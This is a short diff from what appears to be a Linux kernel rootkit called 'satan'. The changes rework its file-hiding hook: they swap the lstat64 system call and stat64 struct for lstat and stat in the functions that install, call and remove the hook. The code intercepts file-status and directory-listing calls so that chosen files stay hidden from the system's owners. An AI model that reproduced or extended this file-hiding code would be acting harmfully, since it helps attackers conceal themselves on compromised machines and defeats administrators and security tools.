@@ -64,12 +64,12 @@ static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
 
 /* sys_lstat64 is hooked in satan_file_init() */
 asmlinkage int (*real_lstat64)(const char __user *filename,
-                               struct stat64 __user *statbuf);
+                               struct stat __user *statbuf);
 
 static int dummy = 0;
 
 asmlinkage long satan_lstat64(const char __user *filename,
-                              struct stat64 __user *statbuf)
+                              struct stat __user *statbuf)
 {
         // Uninitialized for the sake of performance.
         struct hidden_file *f;
@@ -85,7 +85,7 @@ asmlinkage long satan_lstat64(const char __user *filename,
                 }
         }
 
-        real_lstat64 = (void *) satan_syscall_get_original(__NR_lstat64);
+        real_lstat64 = (void *) satan_syscall_get_original(__NR_lstat);
         return real_lstat64(filename, statbuf);
 }
 
@@ -93,7 +93,7 @@ asmlinkage long satan_lstat64(const char __user *filename,
 
 int satan_file_init(void)
 {
-        return satan_syscall_hook(__NR_lstat64, satan_lstat64);
+        return satan_syscall_hook(__NR_lstat, satan_lstat64);
 }
 
 void satan_file_exit(void)
@@ -115,7 +115,7 @@ void satan_file_exit(void)
                 kfree(f);
         }
       
-        satan_syscall_unhook(__NR_lstat64);
+        satan_syscall_unhook(__NR_lstat);
         real_iterate_shared_list_clear();
 }
 
